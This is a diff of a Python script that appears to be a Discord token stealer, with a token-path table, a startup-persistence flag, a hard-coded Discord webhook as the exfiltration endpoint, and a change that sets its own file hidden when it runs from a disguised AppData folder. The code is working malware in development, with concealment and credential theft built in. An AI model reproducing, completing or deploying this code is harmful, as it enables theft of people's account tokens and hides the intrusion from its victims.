@@ -18,13 +18,13 @@ tokenPaths = {
 
 config = {
 	"Startup": True,
-	"Hideconsole": True,
+	"Hide_self": True,
 	"webhook": 'https://discord.com/api/webhooks/1039097523643633684/-DWH0IuPWBN1SuX8Oh-7fnFs14TQfbp3yWgEcM0RGTzu4u2VyNsRxGqTUk-gclmEWWFv',
 }
 
 class main():
 	def __init__(self):
-		if config['Hideconsole']: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+		if config['Hide_self'] and sys.argv[0] == f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Temp/{os.path.basename(__file__)}': ctypes.windll.kernel32.SetFileAttributesW(os.path.basename(__file__), 0x02)
 
 		self.tempfolder = os.path.join(os.getenv("TEMP"),''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
 		os.mkdir(self.tempfolder)
